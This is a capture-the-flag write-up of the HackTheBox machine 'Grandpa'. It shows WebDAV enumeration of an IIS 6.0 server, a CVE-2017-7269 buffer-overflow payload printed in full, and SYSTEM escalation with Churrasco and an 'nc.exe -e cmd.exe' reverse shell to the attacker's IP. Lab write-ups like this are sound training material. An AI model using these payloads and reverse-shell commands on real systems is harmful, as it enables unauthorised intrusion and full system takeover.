# Grandpa - writeup

## Services 
```bash
└─$ nmap -sC -sV -p 80 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 14:32 EDT
Nmap scan report for 10.129.247.97
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Date: Mon, 03 Jul 2023 18:32:45 GMT
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
```
* 80 - `IIS` - IIS 6.0 is a microsoft web server, so we will be attacking a Microsft machine. Web app could be running with `ASP`, the microsoft server side scripting language used to serve web pages.
*Microsft IIS was released in 2003 and is compatible with Windows Server 2003 and Windows XP Professional x64. 6.0 was discontinued in 2015*

ASP suspicion verifed by header received in CURL request `X-Powered-By: ASP.NET`

## HTTP
Main page of website states the site is under construction and does not currently have a defualt web page. I will use gobuster to enumerate directories.

Gobuster failed to find any other directories, but searching for exploits of IIS 6.0 led me to a CVE for a zero-day exploit in WebDav for IIS 6.0. 

### What is webDAV??
WebDAV or **Web Distributed Authoring and Versioning** is an HTTP extension similar to ftp. It allows users to collaboratively author contents in an HTTP web server. 

WebDAV extends the set of stadard HTTP verbs (GET, POST, HEAD, etc.) to include options like COPY, LOCK, MOVE **PROPFIND**. These verbs are sent to the http server like other HTTP headers and are interpreted by the server as if WebDAV functionality is enabled.

Some tools we can use to test a server that has WebDAV enabled:
* cadaver - like ftp with WebDAV, the tool connects to the http server and then accepts verbs to make changes to the server content.
```bash
└─$ cadaver http://$IP
dav:/> help
Available commands:
 ls         cd         pwd        put        get        mget       mput
 edit       less       mkcol      cat        delete     rmcol      copy
 move       lock       unlock     discover   steal      showlocks  version
 checkin    checkout   uncheckout history    label      propnames  chexec
 propget    propdel    propset    search     set        open       close
 echo       quit       unset      lcd        lls        lpwd       logout
 help       describe   about
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
```
* davtest - determines which WebDAV verbs are accepted by the http server 
```bash
└─$ davtest -sendbd auto -url http://$IP
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.129.151.211
********************************************************
NOTE    Random string for this session: uZUKMyP2bfxk
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     aspx    FAIL
PUT     pl      FAIL
PUT     txt     FAIL
PUT     shtml   FAIL
PUT     cfm     FAIL
PUT     jhtml   FAIL
PUT     jsp     FAIL
PUT     php     FAIL
PUT     cgi     FAIL
PUT     asp     FAIL
PUT     html    FAIL
********************************************************
 Sending backdoors

********************************************************
/usr/bin/davtest Summary:
```
### CVE-2017-7269
This vulnerability as a buffer overflow in the ScStoragePathFromUrl function in WebDAV service in IIS 6.0 that allows attackers to run RCE via a long header beginning with `"if:<http://"` in a PROPFIND request.

PROPFIND request are used to retreive properties of a resource, stored as XML. It's often used to retreive metadata.

I was able to find a script on github to exploit this bufferoverflow and get a reverse shell.
```bash
└─$ python2 iis6revShell.py 10.129.247.97 80 10.10.14.178 6666
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰 夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚 慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃 䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪 䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```

## PrivEsc - Administrator

The reverse shell is caught and I get a session as `nt authority\network service`.
Verify that the OS is Windows Server 2003:
```ps
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
```
After getting a reverse shell on IIS service account it's important to check to see if the `SeImpersonate` privilege is enabled as it's low hanging fruit. After checking on this account the privilege is enabled and we should have a path to Root
```cmd
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

After researching exploits for Windows Server 2003 machines with SeImpersonatePrivilege enabled I stumbled upon an exploit titled Churrasco. This exploits a vulnerability found in the Windows Task Scheduler on windows 2003. It's due to the task scheduler not properly enforcing permissions when running tasks. Churrasco can be used to run a task as System. So we can use churrasco to send a reverse shell as SYSTEM with nc.exe.

Setup smb server to transfer binaries:
```bash
└─$ python3 smb.py share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```
Copy files to victim machine:
```cmd
C:\wmpub>copy \\10.10.14.178\share\nc.exe .
copy \\10.10.14.178\share\nc.exe .
        1 file(s) copied.

C:\wmpub>copy \\10.10.14.178\share\churrasco.exe .
copy \\10.10.14.178\share\churrasco.exe .
        1 file(s) copied.
```

Churrasco used the `-d` flag to impersonate SYSTEM for the task. The rest of the command is just using nc to send the shell.
```cmd
C:\wmpub>.\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.178 6666"
.\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.178 6666"
/churrasco/-->Current User: NETWORK SERVICE
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
Catch SYSTEM:
```cmd
C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

Now we can collect the flags and submit them to htb.
